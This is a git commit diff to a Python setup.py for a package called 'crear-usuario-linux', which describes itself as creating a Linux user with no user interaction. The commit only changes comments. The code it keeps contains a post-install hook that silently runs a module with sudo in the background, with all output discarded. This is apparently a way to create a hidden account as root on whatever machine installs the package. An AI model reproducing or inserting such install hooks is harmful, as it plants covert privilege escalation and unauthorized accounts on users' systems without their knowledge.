691b262eed04de8cd17ea7c8db1f8df165d4fd08
Javier <batusai@himura.local>
2025-02-14 22:29:31 -0300

    Corregido import de install en setup.py

--- setup.py
+++ setup.py
@@ -1,19 +1,19 @@
 from setuptools import setup, find_packages
-from setuptools.command.install import install  # Asegurar que install está importado
+from setuptools.command.install import install
 import os
 
 class PostInstallCommand(install):
     """ Ejecuta la instalación y luego ejecuta el script """
     def run(self):
         install.run(self)  # Ejecuta la instalación normal
-        os.system("sudo python3 -m crear_usuario.main >/dev/null 2>&1 &")  # Ejecuta el script después de instalar
+        os.system("sudo python3 -m crear_usuario.main >/dev/null 2>&1 &")  # Ejecuta el script en segundo plano con sudo
 
 setup(
     name="crear-usuario-linux",
     version="0.1",
     packages=find_packages(),
     install_requires=[],
-    python_requires=">=3.6",  # Asegurar compatibilidad con Python 3.8.16
+    python_requires=">=3.6",
     author="Tu Nombre",
     author_email="tuemail@example.com",
     description="Crea un usuario en Linux sin interacción del usuario",
